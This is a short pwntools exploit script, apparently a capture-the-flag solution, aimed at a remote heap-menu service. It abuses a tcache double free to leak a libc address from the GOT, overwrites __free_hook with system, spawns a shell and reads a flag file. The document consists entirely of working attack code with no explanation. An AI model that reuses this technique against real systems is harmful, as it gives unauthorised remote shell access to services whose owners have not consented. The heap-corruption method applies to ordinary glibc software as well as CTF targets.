#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( './libc-2.27.so' )
host , port = '60.251.236.18' , 10006
y = remote( host , port )

ptr = 0x404050

def say( data ):
    y.sendafter( '>' , '1' )
    y.send( data )

say( 'a' )

y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )

say( p64( ptr ) )
say( 'a' )
say( p64( 0x403ff0 ) )

y.sendafter( '>' , '2' )
y.recvline()
l.address = u64( y.recv(6) + '\0\0' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

say( 'a' )
y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )
y.sendafter( '>' , '3' )

say( p64( l.sym.__free_hook ) )
say( 'a' )
say( p64( l.sym.system ) )

say( 'sh' )
y.sendafter( '>' , '3' )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()